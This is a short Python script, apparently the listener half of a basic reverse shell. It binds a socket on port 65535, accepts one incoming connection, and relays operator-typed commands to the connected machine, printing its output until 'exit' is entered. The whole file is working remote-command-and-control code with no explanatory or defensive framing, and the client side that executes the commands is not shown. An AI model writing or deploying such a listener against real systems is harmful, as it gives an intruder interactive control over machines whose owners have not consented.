import socket
import sys

# Create socket
def create_socket():
    try:
        global host
        global port
        global sock
        host = ''
        port = 65535
        sock = socket.socket()
    except socket.error as msg:
        print("Error occured while creating socket: " + str(msg))


# Bind socket to port and listen for clients
def bind_socket():
    try:
        global host
        global port
        global sock
        print("Bind to port: " + str(port))
        sock.bind((host, port))
        sock.listen(5)
    except socket.error as msg:
        print("Error occured while binding socket and port: " + str(msg) + ", retrying..")
        bind_socket()


# Establish connections
def accept_socket():
    connection, address = sock.accept()
    print("Connection established | " + "IP: " + address[0] + " | Port: " + str(address[1]))
    send_instructions(connection)
    connection.close()


def send_instructions(connection):
    while True:
        command = input()
        if command == 'exit':
            connection.close()
            sock.close()
            sys.exit('Session suspended!')

        if len(str.encode(command)) > 0:
            connection.send(str.encode(command))
            client_response = str(connection.recv(1024), "utf-8")
            print(client_response)

def main():
    create_socket()
    bind_socket()
    accept_socket()

main()


